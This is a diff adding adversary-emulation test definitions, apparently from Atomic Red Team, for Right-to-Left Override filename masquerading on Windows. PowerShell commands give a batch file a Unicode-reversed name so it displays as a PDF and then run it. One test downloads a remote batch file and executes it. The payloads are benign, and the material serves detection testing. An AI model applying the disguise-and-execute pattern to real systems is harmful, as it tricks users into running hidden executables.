@@ -1,0 +1,62 @@
+attack_technique: T1036.002
+display_name: "Masquerading:Right-to-Left Override"
+atomic_tests:
+
+- name: 'Masquerading: Right-to-Left Override Batch File Creation and Execution'
+  description: |-
+    'Creates a batch file and then uses the RTLO operator (0x202E) to transform the file name from "evil_batchfdp.bat" to "evil_batchtab.pdf". The script then executes the batch file which displays "Hello World!" for 30 seconds before closing out.'
+  supported_platforms:
+    - windows
+  input_arguments:
+    fileloc:
+      type: path
+      default: '[System.IO.Path]::Combine($env:USERPROFILE, "Desktop")'
+      description: Input the file location. Default is the desktop.
+  executor:
+    command: |-
+      $filepath = #{fileloc}
+      $rtlo = [char]0x202E
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
+      $payload = @"
+      @echo off
+      echo Hello World!
+      timeout /t 30 /nobreak
+      exit
+      "@
+      Set-Content -Path $fileloc -Value $payload -Encoding Ascii -Force
+      Write-Host "Real filename on disk: $fileloc"
+      Write-Host "Displays in explorer as: evil_batchtab.pdf"
+      Start-Process -FilePath $fileloc -Wait
+    cleanup_command: |-
+      $rtlo = [char]0x202E
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
+      Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
+    name: powershell
+    elevation_required: false
+
+- name: 'Masquerading: RTLO Masqueraded File Download and Execution'
+  description: Downloads a batch file that has an obfuscated name utilizing the RTLO operator. The batch file then runs automatically, opening a cmd window and then closing 30 seconds later
+  supported_platforms:
+    - windows
+  input_arguments:
+    fileloc:
+      type: path
+      default: '[System.IO.Path]::Combine($env:USERPROFILE, "Downloads")'
+      description: Location you want to download the file to. Default is the downloads folder
+  executor:
+    command: |-
+      $rtlo = [char]0x202E
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
+      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat" -OutFile $fileloc -UseBasicParsing | Out-Null
+      Start-Process -FilePath $fileloc
+    cleanup_command: |-
+      $rtlo = [char]0x202E
+      $filepath = #{fileloc}
+      $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat")
+      Remove-Item -Path $fileloc -Force -ErrorAction SilentlyContinue
+    name: powershell
+    elevation_required: false
+
+
